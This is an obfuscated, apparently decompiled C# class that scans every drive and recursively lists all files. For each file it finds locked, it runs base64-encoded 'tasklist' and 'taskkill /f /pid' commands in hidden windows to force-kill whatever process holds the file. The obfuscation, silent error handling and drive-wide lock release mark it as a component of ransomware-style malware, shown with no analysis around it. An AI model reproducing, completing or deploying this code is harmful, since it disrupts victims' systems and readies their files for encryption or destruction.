using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace YzTymtbtgFABHvJvj;

internal class fbDAqJbVdGX
{
	[CompilerGenerated]
	private sealed class UoTqfIjsSiMe
	{
		public string cknPytMYfgWbl;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(cknPytMYfgWbl);
		}
	}

	public static readonly List<string> TwGNMjcVWrpnW = new List<string>();

	public static readonly List<string> wqHhQwvVVqf = new List<string>();

	public static void GWkYTCSGPLV()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					NeXqFVFaDsQH(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void NeXqFVFaDsQH(string btwMcaSmQuB)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(btwMcaSmQuB);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					TwGNMjcVWrpnW.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					NeXqFVFaDsQH(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (TwGNMjcVWrpnW.Count <= 0)
		{
			return;
		}
		foreach (string item in TwGNMjcVWrpnW.Where((string iOfeAGIIiR) => muSdOUxGcrOy(iOfeAGIIiR)))
		{
			wqHhQwvVVqf.Add(item);
		}
		TwGNMjcVWrpnW.Clear();
		if (wqHhQwvVVqf.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in wqHhQwvVVqf.Select((string uumMZTBEqXx) => new FileInfo(uumMZTBEqXx)))
		{
			yDSXoshfrbq(item2.Name);
		}
	}

	public static bool muSdOUxGcrOy(string SMOtlTSPyc)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(SMOtlTSPyc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(SMOtlTSPyc, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void yDSXoshfrbq(string aPzRPvqCEDtJgC)
	{
		try
		{
			string text = NgkOpQrozqel(eqCksjvMyn.joRKfFeYni("dGFza2xpc3Q="), eqCksjvMyn.joRKfFeYni("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(aPzRPvqCEDtJgC)
				select t into GvpEwlBwxcvFN
				select GvpEwlBwxcvFN.Split(new char[1] { ',' }) into iOpftNkEklNpRfR
				select iOpftNkEklNpRfR[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				NgkOpQrozqel(eqCksjvMyn.joRKfFeYni("dGFza2tpbGw="), eqCksjvMyn.joRKfFeYni("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string NgkOpQrozqel(string sNxfZxESXPR, string OXXWasPGRtKAT)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(sNxfZxESXPR, OXXWasPGRtKAT);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
